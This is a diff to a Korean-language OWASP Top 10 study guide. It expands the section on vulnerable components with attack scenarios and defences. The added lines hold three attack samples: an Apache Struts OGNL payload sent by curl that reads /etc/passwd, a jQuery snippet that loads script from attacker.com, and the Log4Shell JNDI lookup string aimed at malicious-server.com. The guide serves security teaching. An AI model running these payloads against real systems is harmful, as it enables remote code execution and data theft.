@@ -609,7 +609,8 @@
 
 1. 기본 관리자 계정 및 비밀번호 미변경
 
-   공격자는 웹 에플리케이션의 관리 페이지(`/admin`)에 접근하여 기본 제공 계정 (`admin:admin`)을 사용해 로그인한다.
+   공격자는 웹 에플리케이션의 관리 페이지(`/admin`)에 접근하여
+   기본 제공 계정 (`admin:admin`)을 사용해 로그인한다.
 
    <br>
 
@@ -636,7 +637,8 @@
 
 2. 디버그 모드가 활성화된 상태로 운영
 
-   공격자는 애플리케이션이 디버그 모드가 활성화된 상태에서 실행되는 것을 발견하고, 오류 메세지를 통해 데이터베이스 연결 정보 또는 시스템 구조를 파악한다.
+   공격자는 애플리케이션이 디버그 모드가 활성화된 상태에서 실행되는 것을 발견하고,
+   오류 메세지를 통해 데이터베이스 연결 정보 또는 시스템 구조를 파악한다.
 
    <br>
 
@@ -664,7 +666,8 @@
 
 3. 불필요한 포트 및 서비스 노출
 
-   공격자는 서버에서 실행 중인 불필요한 서비스 및 포트를 스캔하고, 해당 포트를 통해 서버에 접근할 수 있는 취약점을 탐색한다.
+   공격자는 서버에서 실행 중인 불필요한 서비스 및 포트를 스캔하고,
+   해당 포트를 통해 서버에 접근할 수 있는 취약점을 탐색한다.
 
    <br>
 
@@ -699,17 +702,106 @@
 
 - 오래된 라이브러리 및 프레임 워크 사용
 - 알려진 보안 취약점이 있는 버전 사용
+- 보안 패치가 적용되지 않은 소프트웨어 실행
+- 의존성 업데이트 미비로 인해 공격자가 취약점을 악용할 가능성 증가
+
+<br>
 
 **공격 시나리오**:
-Apache Struts의 취약점을 이용한 원격 코드 실행 (RCE) 공격이 있을 수 있다.
 
-**방어 방법**:
+1. Apache Struts 원격 코드 실행 (RCE)
 
-- 최신 보안 패치 적용
-- 의존성 검사 및 보안 업데이트 확인
+   - Apache Struts 2의 특정 버전에는 원격 코드 실행 취약점이 존재한다.
+   - 공격자는 악의적인 입력을 통해 서버에서 임의의 명령을 실행할 수 있다.
+
+   ```bash
+   # 공격자가 악성 페이로드를 전송하여 서버에서 임의의 명령을 실행
+   curl -X POST -H "Content-Type: application/json" \
+      --data '{"name":"%{(#_memberAccess["allowStaticMethodAccess"]=true).(#cmds=("/bin/bash","-c","cat /etc/passwd")).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start())}"}' \
+      http://target.com/vulnerable-endpoint
+   ```
+
+   <br>
+
+   **방어 방법**:
+
+   - 최신 보안 패치를 적용한다. (Apache Struts의 최신 버전으로 업그레이드)
+   - 입력값 검증 및 필터링을 적용한다.
+   - WAF(Web Application Firewall) 설정으로 악성 요청을 차단한다.
+
+<br>
+
+2. jQuery 취약점 (XSS, Prototype Pollution)
+
+   오래된 jQuery 버전은 XSS 및 프로토타입 오염 공격에 취약할 수 있다.
+
+   ```html
+   <script src="https://code.jquery.com/jquery-1.8.3.min.js"></script>
+   <script>
+     $.getScript("http://attacker.com/malicious.js");
+   </script>
+   ```
+
+   <br>
+
+   **방어 방법**
+
+   - 최신 버전의 jQuery를 사용한다.
+   - 콘텐츠 보안 정책(Content Security Policy, CSP)을 적용한다.
+   - 외부 스크립트 로딩을 제한한다.
+
+<br>
+
+3. Log4j 취약점 (Log4Shell, CVE-2021-44228)
+
+   Log4j 2.x 버전 중 일부는 원격 코드 실행 취약점을 포함하고 있어,
+   공격자가 조작된 입력을 로그에 기록하게 하면 원격에서 코드를 실행할 수 있다.
+
+   ```java
+   logger.info("User agent: " + userInput);
+   ```
+
+   공격자가 `userInput` 값에 다음과 같은 악성 페이로드를 입력하면 서버에서 원격 코드 실행이 발생할 수 있다.
+
+   ```bash
+   ${jndi:ldap://malicious-server.com/exploit}
+   ```
+
+   <br>
+
+   **방어 방법**
+
+   - 최신 Log4j 버전으로 업그레이드한다.
+   - `log4j2.formatMsgNoLookups=true` 설정으로 JNDI 조회를 비활성화한다.
+   - `log4j-core`가 불필요하면 제거한다.
+
+<br>
+
+**방어 방법 요약**
+
+1. 보안 패치 및 업데이트
+
+   - 최신 프레임워크, 라이브러리, 소프트웨어를 사용한다.
+   - 자동 업데이트 또는 정기적인 보안 점검을 시행한다.
+
+2. 의존성 검사 및 취약점 분석
+
+   - `npm audit`, `yarn audit`, `composer audit`, `pip-audit` 등의 도구를 사용한다.
+   - OWASP Dependency-Check, Snyk, GitHub Dependabot을 활용한다.
+
+3. 입력값 검증 및 필터링
+
+   - 사용자 입력값을 신뢰하지 않고 철저한 검증을 수행한다.
+   - WAF(Web Application Firewall)을 적용한다.
+
+4. 불필요한 기능 제거
+   - 사용하지 않는 플러그인, 라이브러리, 패키지를 제거한다.
+   - 기본적으로 보안 설정을 강화하고, 필요할 때만 기능을 활성화한다.
 
 <br>
 <br>
+
+---
 
 ### 7. Identification and Authentication Failures, 인증 및 식별 실패
 
